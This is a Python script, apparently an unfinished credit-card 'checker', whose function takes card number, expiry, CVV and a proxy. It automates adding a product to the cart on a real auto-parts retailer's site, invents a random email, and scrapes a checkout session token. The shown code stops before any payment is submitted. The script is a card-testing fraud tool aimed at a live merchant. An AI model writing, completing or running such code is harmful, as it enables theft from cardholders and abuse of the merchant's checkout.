import requests
import random
import string
from faker import Faker

fake = Faker()

def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"

email = random_email()

async def payflow44(cc, mes, ano, cvv, proxyg):
    req1 = requests.get('http://scheiddiesel.com/gaskets-and-seals/6.5L-Chevy-Compression-Washers')
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.scheiddiesel.com',
        'Pragma': 'no-cache',
        'Referer': 'http://scheiddiesel.com/gaskets-and-seals/6.5L-Chevy-Compression-Washers',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }
    
    data = {
        'target': 'cart',
        'action': 'add',
        'product_id': '21546',
        'category_id': '276',
        'page': '',
        'amount': '1',
    }

    req2 = requests.post('https://www.scheiddiesel.com/?', headers=headers, data=data)
    
    res = requests.get('https://www.scheiddiesel.com/?target=cart')
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': 'store_language=en; __utmc=79631254; __utmz=79631254.1731125350.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __smVID=241656fba3fe2eb87ac95bfae01ba67251d1ed963b0b0915a9b3cf8604274b2d; brandcdn_uid=52ca6ced-370a-4d40-af53-4e43a67551b6; __smListBuilderShown=Fri%20Nov%2008%202024%2021:09:27%20GMT-0700%20(hora%20est%C3%A1ndar%20del%20Pac%C3%ADfico%20de%20M%C3%A9xico); RefererCookie=https%3A%2F%2Fwww.scheiddiesel.com%2F; xid_a431f=e23c4b2eb5c9ebe84a4013cdcf5f1836; __utma=79631254.1343589729.1731125350.1731125350.1731143831.2; __utmt=1; __utmb=79631254.2.10.1731143831',
        'Pragma': 'no-cache',
        'Referer': 'https://www.scheiddiesel.com/?target=cart',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'mode': 'checkout',
    }

    req3 = requests.get('https://www.scheiddiesel.com/?target=checkout', params=params, headers=headers)
    xid = req3.text.split('name="xid_a431f" value="')[1].split('"')[0]